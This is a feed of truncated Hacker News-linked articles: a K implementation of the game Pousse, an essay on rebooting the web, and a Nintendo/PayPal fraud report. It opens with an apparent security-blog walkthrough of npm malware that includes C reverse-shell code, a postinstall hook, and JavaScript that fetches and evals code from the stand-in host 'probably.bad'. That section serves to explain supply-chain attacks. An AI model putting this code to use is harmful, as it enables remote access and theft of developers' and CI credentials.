		goto Cleanup;
	}

	if(-1 == dup2(sock, STDIN_FILENO)) {
		goto Cleanup;
	}

	if(-1 == dup2(sock, STDERR_FILENO)) {
		goto Cleanup;
	}
	execlp("/bin/bash", "bash", NULL);

Cleanup:
	close(sock);
    
    return 0;
}</code></pre><figcaption>A simple reverse shell</figcaption></figure><p>A small program that will essentially give us a reverse shell - first by opening a socket, connecting to our "remote" server, redirecting stdin/stdout/stderr to our new socket, and then executing bash. From here, we have full console access to the local machine in the same context as the current user (presumably either a developer or a CI runner). </p><p>While this certainly works, and gives us access, it comes with some serious limitations. For one, it's fairly trivial to detect - a simple <code>netstat -an</code> will identify it easily. Another issue is that we have to be ready to accept the connection as soon as the user runs <code>npm install</code>, as it will only try to connect out once, and will die when the current user logs off (barring detached terminals or similar). Finally, it is very overt - not only would most network security devices (IDS or IPS) catch this traffic in-flight, even a casual observer would find this when perusing the <code>package.json</code>. </p><p>Oddly enough, however, the last point (at least, regarding the <code>package.json</code>) is less bad than one might think - while trivial observations would certainly catch it, if our malware is upstream from any non-trivial package installation, manual <a href="https://blog.phylum.io/what-is-the-state-of-npm/">identification might end up being nearly impossible.</a> In fact, as documented in "The Backstabber's Knife Collection" (linked earlier in the article), this sort of scheme <em>has</em> worked for a large subset of discovered javascript malware. Still, we can almost certainly do better.</p><h3 id="walk">Walk </h3><p>Now we have a notional infection vector (via our <code>postinstall</code> script), and some code to give us access to the remote host. Where do we go from here to look at improving our setup? We can draw some inspiration from <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes">malware added upstream from <code>eslint</code></a> which harvested (and shipped off) tokens and credentials from the local system, effectively giving attackers the ability to modify previously-published packages controlled by the current user at a future date.</p><p>While we're actually obtaining credentials here, focusing on a single file with a small number of credentials that may (or may not) be on most of the machines we land on seems a bit lackluster when we can look for other locally stored credentials (e.g., AWS tokens, SSH keys, etc) and environment variables.</p><p>In order to get this new functionality up and running, we can start by making a quick change to our previous <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.1",
    /* ... */
    "scripts": {
        "postinstall": "node ./lib/build.js"
    }
}</code></pre><p>Now instead of running our <em>new</em> malware directly in this file, we'll make it slightly stealthier by remote-hosting the file, and pulling it down at runtime. A quick first pass at this might resemble the following:</p><pre><code>try {
    const https = require("https");
    https.get({
        hostname: "probably.bad",
        path: "/new-malware",
        headers: {
            Accept: "text/html"
        }
    }, 
    res =&gt; { res.on("data" d =&gt; eval(d)); })
        .on("error", () =&gt; {});
       
} catch (e) {}</code></pre><p>Interestingly enough, this is actually <em>almost</em> exactly the same as the malware that launched in the aforementioned <code>eslint</code> attack: it would pull the file retrieval script from a remote host (where we've slotted in our hypothetical attack domain, "probably.bad", the original utilized pastebin), and simply eval the text. While this is mostly effective, there is a critical flaw here - if for some reason we don't get the entire script to execute in the first chunk, our <code>eval</code> will likely fail with syntax error, as we might be attempting to execute half a script (for reference, a copy of the original malware with deeper explanation of the attack and constituent parts can be found <a href="https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e">here</a>), which ended up resulting in the attack being discovered quickly. </p><p>Now certainly the first issue is relatively simple to fix: we need to ensure we've downloaded the <em>full</em> file before we attempt to eval. &nbsp;To that end, what we probably want is something more like the following:</p><pre><code>try {
    const https = require("https");
    https.get("https://probably.bad/new-malware", res =&gt; {
        let tmp = "";
        res.on("data", d =&gt; tmp += d);
        res.on("end", () =&gt; eval(tmp));
    }).on("error", () =&gt; {});
} catch(e) {}</code></pre><p>This should get us more consistent execution at least, but now to think about <em>what</em> we should be harvesting - are NPM creds or crypto wallets really the best we can do? If we think about this a bit, there are two general contexts under which we will run:</p><ol><li>On a developer's system.</li><li>On a CI runner.</li></ol><p>From an attacker's perspective, both places are interesting - albeit for slightly different reasons. In the first case, the answer is somewhat obvious: we are going to be running on a developer's workstation while a project is being built and tested locally. This means that things like credentials (NPM creds, SSH keys, and many more) will likely be available for access and exfiltration, among other things. The second scenario, however, is also interesting - CI runners often get sensitive items such as database credentials, infrastructure keys, and similar injected during the build process. Past experience also shows that some attackers have …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.phylum.io/malicious-javascript-code-in-npm-malware/">https://blog.phylum.io/malicious-javascript-code-in-npm-malware/</a></em></p>]]>
            </description>
            <link>https://blog.phylum.io/malicious-javascript-code-in-npm-malware/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247478</guid>
            <pubDate>Sat, 22 Aug 2020 21:39:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pousse (1999)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24247389">thread link</a>) | @tosh
<br/>
August 22, 2020 | http://www.nsl.com/papers/push.htm | <a href="https://web.archive.org/web/*/http://www.nsl.com/papers/push.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<h2>Introduction</h2>

<p>The challenge task for the 1998 ICFP Functional Programming
Contest consisted of a program for playing the game 'Pousse', or
'Push'.</p>

<p>The contest was announced on a Thursday evening and ran
through the weekend. A single judge's prize, for the most thought-provoking
entry, was awarded to the J Language team from Iverson Software,
Inc.</p>

<p>The <a href="http://www.jsoftware.com/papers/pousse.htm">J
entry</a> consists of 113 lines of code (excluding comments and
test code). A full screen interactive version contains 400 lines.
</p>

<p>Pousse is played by two players X and O on an N x N board.
Player X always moves first. A token may be entered from the
left, the right, the top, or the bottom of the board, giving a
total of N * 4 possible moves.</p>

<p>Placing a token onto the board causes all tokens in that row
or column up to the first unoccupied cell to be shifted to make
room for the new token. If the row or column is fully occupied,
the last token is pushed off the board.</p>

<p>A row or column fully occupied by tokens of the same color is
called a straight. </p>

<p>The game rules are:</p>

<blockquote>
<ul>
<li>A player wins when he achieves a surplus of straights.</li>
<li>A player loses if his move causes the board to re-enter a state which he caused earlier in the game.</li>
<li>A player loses if he exceeds the time-limit on a turn.</li></ul>
</blockquote>

<h2>Strategy</h2>

<p>Notwithstanding its simplicity, the playing strategy developed
by the J team is surprisingly effective:</p>

<blockquote>
<ul>
<li>On my turn, evaluate the boards resulting from my 4 * N moves.</li>
<li>If all moves result in an immediate loss for me, select any one of those.</li>
<li>Else if there are winning moves for me, select any one of those.</li>
<li>Else select one of the moves which minimize the best counter-move of my opponent.</li>
</ul>
</blockquote>

<h2>K implementation</h2>

<p>The <a href="http://www.nsl.com/k/push.k">K implementation</a> of Pousse uses
the J strategy.</p>

<p>The program supports two playing modes: interactive
competition between a human player and a machine, and self-play,
which pits the strategy against itself.</p>

<p>The K implementation (henceforth called 'push.k') consists of
92 lines of code. This comprises the playing logic and strategy (36
lines), as well as the global state (14 lines), GUI (13 lines),
on-line help (22 lines), and run-time procedures (7 lines).</p>

<h2>Design</h2>

<p>The script for push.k is divided into five main sections: the
playing logic, the global state, the GUI, the on-line help text,
and the procedures for initializing state when the script is
loaded. These sections are separated by single blank lines.</p>

<p>It is convenient to begin with section 2, the global state.</p>

<h2>State</h2>

<p>The script is written to accept two optional command-line
arguments: N, the number of cells along a side of the board, and
T, the timeout value in seconds. The default values are N = 6, T
= 30.</p>

<p>Following the empirical results obtained by the J team, the
cells of an N x N board are weighted to the center. The variable
D is recomputed whenever N is changed, and always has shape N x N.
For N = 6:</p>

<blockquote>
        <pre>  D
(1 2 3 3 2 1
 2 3 4 4 3 2
 3 4 5 5 4 3
 3 4 5 5 4 3
 2 3 4 4 3 2
 1 2 3 3 2 1)</pre>
</blockquote>

<p>For an N x N board, the set of N * 4 valid
moves is contained in M. For N = 3:</p>

<blockquote>
        <pre>  M
((`L;0)
 (`L;1)
 (`L;2)
 (`T;0)
 (`B;0)
 (`T;1)
 (`B;1)
 (`T;2)
 (`B;2)
 (`R;0)
 (`R;1)
 (`R;2))</pre>
</blockquote>

<p>A board is represented as an N x N character
matrix. The board-history of a game containing k moves is
represented as a (k+1) x N x N list H. Initially, H consists of a
single empty board. For N = 3:</p>

<blockquote>
        <pre>  H
,("   "
  "   "
  "   ")</pre>
</blockquote>

<p>In the course of play, boards are appended to H.</p>

<p>The move-history of a game containing k moves
is kept in a k x 2 list:</p>

<blockquote>
        <pre>  I
(("X"
  (`B;1))
 ("O"
  (`L;0))
 ("X"
  (`B;1))
 ("O"
  (`T;9))
 ("X"
  (`B;1)))</pre>
</blockquote>

<p>Move I[0] consisted of X playing (`B;1), and
transformed the board from state H[0] to H[1]:</p>

<blockquote>
        <pre>  H[0 1]
(("   "
  "   "
  "   ")
 ("   "
  "   "
  " X "))</pre>
</blockquote>

<p>At the start of each game, the token of the
machine is randomly selected and stored in P. In the game above,
P = "X".</p>

<p>The variables W and O jointly represent the
outcome of the game. Initially, they are W = " " and O
= 0.</p>

<p>If X wins, then W = "X" and O = 1,
and if X loses, then W = "X" and O = -1.</p>

<p>At the start of each turn, the global counter C
is set to 0. Each second, a timer function fires which increments
C and compares it to T, the timeout value. If T = C, the player
of the turn loses.</p>

<p>The boolean global S is used to distinguish
human-machine play (S = 0) and self-play (S = 1).</p>

<p>The variables E and R are used by the GUI (see
below). </p>

<h2>Dependencies</h2>

<p>push.k uses K dependencies to keep global state
and GUI self-consistent.</p>

<p>In general, there are two ways to keep GUI and
global state consistent. In most programming environments, a
procedural method is used: whenever any part of the state
changes, invoke procedures to update the rest of the state and
the GUI, and whenever any part of the GUI changes, invoke
procedures to update the rest of the GUI and the state. The
disadvantage of the procedural approach is that small changes to
the system require changes to many procedures. </p>

<p>The alternative method uses dependencies: the
state is defined as a functional dependency network, and the GUI
is defined as a dependency on state. Whenever the root of the
network changes, the rest of the network, including state and
GUI, is invalidated; reference to any dependent component causes
that component (and all components on which it depends) to re-evaluate.</p>

<p>The root of the push.k dependency network is N.
All variables, including those which are mapped to the screen as
constituents of the playing window, ultimately depend on the size
of the board.</p>

<p>D, the weight matrix, is a function of N:</p>

<blockquote>
        <pre>D..d:"weights N" </pre>
</blockquote>

<p>E, a list of indices into those edge positions
of the board which accept click events, is a function of N:</p>

<blockquote>
        <pre>E..d:"edges[-1_'1_'(N+2)_vs!_(N+2)^2]N+1" </pre>
</blockquote>

<p>M, the list of moves is a function of N and E.</p>

<blockquote>
        <pre>M..d:"moves[N].'E" </pre>
</blockquote>

<p>R, a vector of indices into E which do not
repeat previous states of the board, depends on H and M.</p>

<blockquote>
        <pre>R..d:"nreps[H]M"</pre>
</blockquote>

<p>H, the board history, is reinitialized to ,(N,N)#"
" whenever N changes.</p>

<blockquote>
        <pre>H..d:",(N,N)#\" \""</pre>
</blockquote>

<p>P, the token assigned to the machine, is
recomputed whenever N changes.</p>

<blockquote>
        <pre>P..d:"N;piece[]"</pre>
</blockquote>

<p>I, W, C, S, and O, described above, are reset
to constant values whenever N changes.</p>

<blockquote>
        <pre>I..d:"N;()" 
W..d:"N;\" \"" 
C..d:"N;0" 
S..d:"N;0" 
O..d:"N;0"</pre>
</blockquote>

<p>Whenever N is reset, the global state (including
the GUI variables described below) is invalidated. A trigger on
N,</p>

<blockquote>
        <pre>N..t:"hd[];sh[]"</pre>
</blockquote>

<p>causes the window to be hidden, and then shown.
</p>

<blockquote>
        <pre>hd:{`hide$`.k} 
sh:{`show$`.k} </pre>
</blockquote>

<p>Showing the window causes the invalid global
state to be recomputed to appropriate values, which in turn
causes the window to be redrawn with correct size, color, and
labels.</p>

<h2>Logic</h2>

<p>We step through the evaluation of two moves.</p>

<p>Begin by executing the niladic function 'play':</p>

<blockquote>
        <pre>Z.play:{N::;if[P="X";me who[]]}</pre>
</blockquote>

<p>N is reset to its current value, invalidating
all state variables and causing the playing window to be
refreshed. </p>

<p>If P is "X", then the machine makes
the first move. The niladic function 'who' returns the token of
the current player. Since X always moves first, the token of the
current player is simply the parity of the length of the board-history
H:</p>

<blockquote>
        <pre>who:{"OX"(#H)!2}</pre>
</blockquote>

<p>If the game is not over, then initialize the
timer counter C, and call 'go' with token x and the move computed
by the strategy function 'str'.</p>

<blockquote>
        <pre>me:{if[~O;C::0;go[x]str[x;*|H]]}</pre>
</blockquote>

<p>'str' takes two arguments: token x and the
current state of the board (the last item in H):</p>

<blockquote>
        <pre>str:{:[#R;ev2[x;move[x;y]'M R];*M]}</pre>
</blockquote>

<p>If there are moves which do not repeat the
previous state of the board -- that is, if 0 &lt; #R -- then call
'ev2' to select from the space of possible moves, else return the
first move. Observe that if no non-repeating moves are available,
the game is lost: *M is no worse than any other move.</p>

<p>'ev2' takes two arguments: token x, and a list
of the boards which result from x applying a non-repeating move
to board y.</p>

<p>First we look at 'move' and its subfunctions. </p>

<p>'move' takes token x, board y, and move-instruction
z and returns the result of applying (x;z) to y.</p>

<blockquote>
        <pre>move:{F[*z;1]@[F[*z;0]y;z 1;push[x]]}
push:{x,y _di(-1+#y)&amp;y?" "}
F[`T`R`L`B]:((+:;+:);(|:';|:');(::;::);(|:'+:;+|:'))</pre>
</blockquote>

<p>z has the form (f;n), where f is `L, `R, `T, or
`B, and n is in 0 ... N-1. Suppose that f is `L and the nth row
of board y is</p>

<blockquote>
        <pre>"XXO X "</pre>
</blockquote>

<p>Then if x is "X", the result of
applying move (f;n) to board y is</p>

<blockquote>
        <pre>"XXXOX"</pre>
</blockquote>

<p>Alternatively, suppose that the nth row of y is</p>

<blockquote>
        <pre>"XXOOXO"</pre>
</blockquote>

<p>Then the result is:</p>

<blockquote>
        <pre>"XXXOOX"</pre>
</blockquote>

<p>Rather than write four special cases to deal
with left, right, top, and bottom token-insertion, 'move'
transforms the board so that 'push' can treat any move as an
insertion from the left, then applies the reverse transformation
to the result. The four pairs of transformations are stored in
the dictionary F. For example, suppose that f is `T. Then F[f] is
(+:;+:). F[f;0] transposes the board, putting the top of y on the
left:</p>

<blockquote>
        <pre>  y
("XOX"
 " XO"
 "   ")</pre>
        <pre>  F[`T;0]y
("X  "
 "OX "
 "XO ")</pre>
</blockquote>

<p>and F[f;1] undoes the transformation.</p>

<p>The way to read </p>

<blockquote>
        <pre>F[*z;1]@[F[*z;0]y;z 1;push[x]] </pre>
</blockquote>

<p>is: </p>

<blockquote>
        <pre>apply F[*z;1] to:
 the result of applying push[x] to:
  the z 1-th row of the result of applying F[*z;0] to:
   y</pre>
</blockquote>

<p>The 'push' function prepends token x to row y
from which we remove either the first blank (case 1 above) or the
last token (case 2 above). That is, we read</p>

<blockquote>
        <pre>x,y _di(-1+#y)&amp;y?" " </pre>
</blockquote>

<p>as: x joined with y without the index of the
minimum of the last position and the index of the first blank.</p>

<p>Now we can return to 'ev2'.</p>

<blockquote>
        <pre>ev2:{any@:[#i:&amp;0&lt;x evs'y;i;mmx opp[x]ev''y move[opp x]/:\:M]}
mmx:{&amp;(&amp;/m)=m:|/'x}
any:{M R x()_draw#x}</pre>
</blockquote>

<p>x is the current token and y is a list of
boards. 'ev2' applies 'any' to the result of a conditional of the
form</p>

<blockquote>
        <pre>:[a;b;c]</pre>
</blockquote>

<p>In the condition, we check to …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.nsl.com/papers/push.htm">http://www.nsl.com/papers/push.htm</a></em></p>]]>
            </description>
            <link>http://www.nsl.com/papers/push.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247389</guid>
            <pubDate>Sat, 22 Aug 2020 21:26:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Clean Start for the Web]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24247362">thread link</a>) | @simantel
<br/>
August 22, 2020 | https://macwright.com/2020/08/22/clean-starts-for-the-web.html | <a href="https://web.archive.org/web/*/https://macwright.com/2020/08/22/clean-starts-for-the-web.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The web is in need of some reinvention right now.</p><p>The web’s evolution over the last decade has mirrored the American economy. All of the essential indicators are going “up and to the right,” a steady stream of fundamental advances reassure use that there “is progress,” but the actual experience and effects for individuals stagnates or regresses.</p><p>The crisis affects platforms, creators, and consumers alike.</p><p><em>I’m going to try and dissect and diagnose this situation, a bit. You can skip forward if you just want to read my casual, unprofessional pitch for a reboot of the web. The idea is that we could choose a new lightweight markdown format to replace HTML &amp; CSS, split the web into documents and applications, and find performance, accessibility, and fun again.</em></p><details><summary>This post uses the pedantic definition of "the web"</summary>I've discussed attempts to reinvent the "Internet" a few times. Things like dat, IPFS, and arweave are all projects to reinvent an Internet, or a transport and data-sharing layer. The web is what lies on top of that, the HTML, CSS, URLs, JavaScript, browsing experience.</details><h3 id="the-platform-collapse">The platform collapse</h3><p>The platform side is what changed last week, when <a href="https://arstechnica.com/information-technology/2020/08/firefox-maker-mozilla-lays-off-250-workers-says-covid-19-lowered-revenue/">Mozilla laid off 250 employees</a> and indicated that it would affect Firefox development. Firefox wasn’t the #2 browser - that’s Safari, mainly because of the captive audience of iPhone and iPad users. But it was the most popular browser that people <em>chose</em> to use.</p><p><img alt="Chart of browser market share, with Chrome becoming the monopoly" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-chart-of-browser-market-share-with-chrome-becoming-the-monopoly.png"></p><p><em>Chart from <a href="https://gs.statcounter.com/browser-market-share#monthly-200901-202007">statcounter</a></em></p><p>The real winner is not just Chrome, but Chrome’s engine. One codebase, <a href="https://en.wikipedia.org/wiki/KHTML">KHTML</a>, split into <a href="https://en.wikipedia.org/wiki/WebKit">WebKit</a> (Safari), and <a href="https://en.wikipedia.org/wiki/Blink_(browser_engine)">Blink</a> (Chrome, Microsoft Edge, Opera, etc.)</p><p>This a textbook monoculture. In one sense, it’s a victory for collaboration because nobody’s ‘wasting time’ on competing implementations and web developers can expect the same features and bugs across different browsers. But in a deeper way, it threatens one of the basic principles of how the web has evolved.</p><h3 id="specs--implementations">Specs &amp; implementations</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.webp" type="image/webp"><img alt="Decline" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.jpg"></picture></p><p>The web has evolved through a combination of <em>specifications</em> and <em>implementations</em>. Organizations like the <a href="https://whatwg.org/">WHATWG</a>, <a href="https://www.w3.org/">W3C</a>, and <a href="https://www.ietf.org/">IETF</a> have been collaboration spaces for independent developers, corporations, and academics to discuss potential new features of the web. Then, browsers would test those ideas out in a variety of implementations.</p><p>This was an interesting structural piece: it reassured us all that it was <em>possible</em> to follow along, and that a multi-participant web was one of our goals. It was frustrating to pull up <a href="https://caniuse.com/">caniuse</a> and see blank spots, but the idea was that different browsers may take the lead in some areas, but everyone catches up eventually. Chrome was not always the first to jump on features, or the first to optimize.</p><p>It’s slower to collaborate than to work alone, but it was beneficial in some ways that we’ve lost now. Chrome has been moving extremely fast, adding new specifications and ideas at a startling rate, and it’s becoming one of the hardest pieces of software to replicate.</p><p>Mike Healy I think <a href="https://twitter.com/mike_hasarms/status/1296575224599556097">said it best</a>:</p><blockquote><p>Do you think the web has almost ‘priced itself out of the market’ in terms of complexity if only 1-2 organisations are capable of building rendering engines for it?</p></blockquote><p>Not only is it nearly impossible to build a new browser from scratch, once you have one the ongoing cost of keeping up with standards requires a full team of experts. Read Drew DeVault’s <a href="https://drewdevault.com/2020/08/13/Web-browsers-need-to-stop.html">Web browsers need to stop</a> for that point, and keep reading all of Drew’s stuff.</p><details><summary>What about Flow?</summary>Yep, there’s a <a href="https://www.ekioh.com/flow-browser/">browser called Flow</a>, which may exist and may support a full range of web standards. If it does exist, I’ll be very excited about it, but it has been teased for almost a year now without any concrete evidence, so it could equally be vaporware.</details><h3 id="the-problem-for-creators">The problem for creators</h3><p>The web has gotten much harder to develop for.</p><p>The web has had about 25 years to grow, few opportunities to shrink, and is now surrounded by an extremely short-sighted culture that is an outgrowth of economic and career short-termism. There are lots of <a href="https://frankchimero.com/blog/2018/everything-easy/">ways to do anything</a>, and some of the most popular ways of building applications on the web are - in my opinion - <a href="https://macwright.com/2020/05/10/spa-fatigue.html">usually ghoulish overkill</a>.</p><p>The best way for folks to enter <em>web development</em> in 2020 is to choose a niche, like <a href="https://vuejs.org/">Vue.js</a> or <a href="https://reactjs.org/">React</a>, and hope that there’s a CSS and accessibility expert on their team.</p><p>For folks who just want to create a web page, who don’t want to enter an industry, there’s a baffling array of techniques, but all the simplest, probably-best ones are stigmatized. It’s easier to stumble into building your resume in React with GraphQL than it is to type some HTML in Notepad.</p><h3 id="the-problem-for-consumers">The problem for consumers</h3><p>We hope that all this innovation is <em>for the user</em>, but often it isn’t. Modern websites seem to be as large, slow, and buggy as they’ve ever been. Our computers are <a href="https://macwright.com/2019/11/15/something-is-wrong-with-computers.html">barely getting faster</a> and our internet connection speeds are stagnating (don’t even <em>try</em> to mention 5G). Webpage <a href="https://www.pingdom.com/blog/webpages-are-getting-larger-every-year-and-heres-why-it-matters/">size growth</a> is outpacing it all.</p><p>The end result is that I no longer expect pages to be fast, even with <a href="https://github.com/gorhill/uBlock">uBlock</a> installed in Firefox and a good local <a href="https://sonic.net/">fiber internet provider</a>.</p><p>I don’t want to lay all of the blame at <em>those web developers</em>, though. Here’s a story from an old job that I find kind of funny. We were collecting some data from user interactions to answer simple questions like “do people click to upload or do they drag &amp; drop?” So we enabled <a href="https://segment.com/">Segment</a>, a tool that lets you add data-collection pipelines by including a single script. The problem, though, is that Segment offered a big page of on/off switches with hundreds of data providers &amp; ad-tech companies on it. And, sure, enough, some folks closer to the business side started <em>clicking all those buttons</em>.</p><p>See, the problem with ads and data tracking is that <em>you can</em>, and who is going to say no? (In that instance, I said no, and added a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a> that would block new advertiser access at the page level.)</p><h2 id="recreating-simplicity">Recreating simplicity</h2><blockquote><p>You cannot get a simple system by adding simplicity to a complex system. - <a href="http://erlang.org/pipermail/erlang-questions/2012-March/065087.html">Richard O’Keefe</a></p></blockquote><p>Where do we go from here? Some of the smartest folks out there have been <a href="https://twitter.com/_developit/status/1296628134406692865">advocating for a major version revision</a> of the web.</p><p><em>I am in no way qualified to speculate on a whole new web from scratch, but the <a href="https://www.nytimes.com/2020/08/21/us/california-wildfires.html">air quality</a> is scary so I’m skipping my run and it’s Saturday morning so here we are.</em></p><p>How do we make the web fun, participatory, and good?</p><p>My first thought is that there are two webs:</p><h3 id="the-document-web">The document web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.webp" type="image/webp"><img alt="Illustration of web pages" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.jpg"></picture></p><p>There is the “document web”, like blogs, news, Wikipedia, Twitter, Facebook. This is basically the original vision of the web, as far as I can understand it (I was 2). Basically CSS, which we now think of as a way for designers to add brand identity and tweak pixel-perfect details, was instead mostly a way of making plain documents readable and letting the <em>readers</em> of those documents customize how they looked. This attribute actually <a href="https://twitter.com/autiomaa/status/1296755641164468224">survived for a while in Chrome, in the form of user stylesheets</a>, and <a href="https://davidwalsh.name/firefox-user-stylesheet">still works in Firefox</a>. Though it’s going to be a rough ride in the current web which has basically thrown away <a href="https://en.wikipedia.org/wiki/Semantic_HTML">semantic HTML</a> as an idea.</p><h3 id="the-application-web">The “application” web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.webp" type="image/webp"><img alt="Illustration of machines" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.jpg"></picture></p><p>Then there’s the “application web”. This started as <em>server</em> applications, built with things like <a href="https://www.djangoproject.com/">Django</a> and <a href="https://rubyonrails.org/">Ruby on Rails</a> and before them a variety of technologies that will live forever in corporations, like <a href="https://en.wikipedia.org/wiki/Jakarta_Servlet">Java Servlets</a>.</p><p><a href="https://backbonejs.org/">Backbone.js</a> demonstrated that a lot of these applications could be moved into the browser, and then <a href="https://reactjs.org/">React</a> and its many SPA-style competitors established a new order for the web – highly-interactive, quite complex, client-side applications.</p><h3 id="the-war-between-the-parts-of-the-web">The war between the parts of the web</h3><p>I posit that this dual-nature is part of what gives the web its magic. But it’s also a destructive force.</p><p>The magic is that a simple blog can be creative expression, can be beautifully interactive. This one isn’t, but I’m just saying - <a href="https://www.typewolf.com/site-of-the-day">it’s possible</a>.</p><p>The problem is that the “document web” is often plagued by application characteristics - it’s the JavaScript and animations and complexity that makes your average newspaper website an unmitigated disaster. Where document websites adopt application patterns they often accidentally sacrifice <a href="https://www.a11yproject.com/">accessibility</a>, performance, and <a href="https://en.wikipedia.org/wiki/Web_scraping">machine readability</a>.</p><p>And the “application web” is plagued by the document characteristics - interactive applications are going to great lengths to avoid most of the essential characteristics of HTML &amp; CSS and just use them as raw materials - avoiding writing any HTML directly at all, avoiding <a href="https://mxstbr.com/thoughts/css-in-js">writing any CSS directly at all</a>, avoiding <a href="https://www.react-spring.io/">default animation features</a>, replacing <a href="https://reactrouter.com/">page-based navigation with something that looks like it but works completely differently</a>. The application web uses <a href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>, not HTML, and would like that in the browser itself, or <a href="https://svelte.dev/">Svelte</a>, instead of JavaScript, and would like that too.</p><p>When I read blog posts from ‘traditional web developers’ who are mad that HTML &amp; CSS aren’t enough anymore and that everything is complicated –&nbsp;I think this is largely that the application stack for building websites has replaced the document stack in a lot of places. Where we would use Jekyll or server-side rendering, we now use React or Vue.js. There are advantages to that, but for a lot of minimally-interactive websites, it’s throwing away decades worth of knowledge in exchange for certain performance perks that might not even matter.</p><p>The appeal of social networks is partly because they let us create <em>documents</em> without thinking about web technology, and they provide guarantees around performance, accessibility, and polish that otherwise would take up our time. You don’t have to think about whether your last Facebook post will load quickly on your friend’s phone or whether your Instagram post will be correctly cropped and resized in the timeline - those things are taken care of.</p><p>To some extent, this doesn’t <em>need</em> to be something that only social networks provide, though: standards like <a href="https://en.wikipedia.org/wiki/RSS">RSS</a> and services like <a href="https://www.instapaper.com/">Instapaper</a> show that pleasing formatting and distribution can be done at the <em>platform level</em> and be provided on top of existing vanilla websites.</p><details><summary>These are not absolutes.</summary>Yeah, I can hear it now: but these categories are not …</details></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macwright.com/2020/08/22/clean-starts-for-the-web.html">https://macwright.com/2020/08/22/clean-starts-for-the-web.html</a></em></p>]]>
            </description>
            <link>https://macwright.com/2020/08/22/clean-starts-for-the-web.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247362</guid>
            <pubDate>Sat, 22 Aug 2020 21:22:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hackers can get your PayPal information via your linked Nintendo accounts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24247191">thread link</a>) | @Gamermeme
<br/>
August 22, 2020 | https://nintendosmash.com/hackers-can-get-the-paypal-information-via-your-linked-nintendo-accounts/ | <a href="https://web.archive.org/web/*/https://nintendosmash.com/hackers-can-get-the-paypal-information-via-your-linked-nintendo-accounts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="the-post">
			
			<p><img width="660" height="330" src="https://nintendosmash.com/wp-content/uploads/2020/04/nintendo-security-660x330.jpg" alt="Hackers can get the PayPal information via your linked Nintendo accounts">		</p>
	
		


			<div>

							

						
<p>
		
	
	
		
	<span><i></i>April 13, 2020</span>	
	<span><i></i><a href="https://nintendosmash.com/category/news/" rel="category tag">News</a></span>
	
	
</p>

			
				<div>
					
					
					
<p>If you have your PayPal account linked to Nintendo please remove it NOW. Hackers are active nowadays and trying to get access to your PayPal, it was informed by some of Social media Users.</p>




<p>Twitter users are reporting that hackers got their PayPal information via their linked Nintendo accounts and are using it to purchase V-bucks. </p>



<p>After a long conversation with the victims, we got that Hackers were managing to discover or tap into people’s PayPal information and use it to purchase V-Bucks, the premium currency for Fortnite.</p>



<p>On Mar 19, 2020, one of the Twitter users advised the Nintendo customers</p>



<blockquote><p> If you have your PayPal account linked to Nintendo please remove it NOW, me and several of my mutuals (among many others) have been hacked and hit with hundreds of dollars worth of charges of fortnite currency </p></blockquote>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>If you have your PayPal account linked to Nintendo please remove it NOW, me and several of my mutuals (among many others) have been hacked and hit with hundreds of dollars worth of charges of fortnite currency</p><p>I am out $250 and trying to keep my shit together and not explode lol</p></div>— ✡ Reed ✡ (@contrabeast) <a href="https://twitter.com/contrabeast/status/1240459185969664001?ref_src=twsrc%5Etfw">March 19, 2020</a></blockquote>
</div></figure>



<p>Furthermore, it was reported that a great number of users who attached their PayPal information to the Nintendo account got affected by the Hackers, although reports suggest that some people don’t even have Fortnite installed.</p>



<p>If you’re also one of them who got affected by the hackers, then you are advised not to contact your Bank on the spot.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">This happened to my boyfriend a week ago. DO NOT CONTACT YOUR BANK FIRST OR NINTENDO WILL THINK YOUR COMMITTING FRAUD AND SUSPEND YOUR NINTENDO ACCOUNT. Contact them first so they are aware it was a charge not made by you. Just a heads up.</p>— tired bitch (@deceaseddeer) <a href="https://twitter.com/deceaseddeer/status/1240516586659815424?ref_src=twsrc%5Etfw">March 19, 2020</a></blockquote>
</div></figure>



<p>Because of this situation, you’re advised to unlink your PayPal Account. In order to unlink the payment method you first need to sign in to the Nintendo eShop as usual. Once in simply click on your profile icon in the top right-hand corner of the screen and this will bring up your account information. Next, you can scroll down to the PayPal account, which is about four options down. Finally, hit the unlink option to remove the payment method.</p>



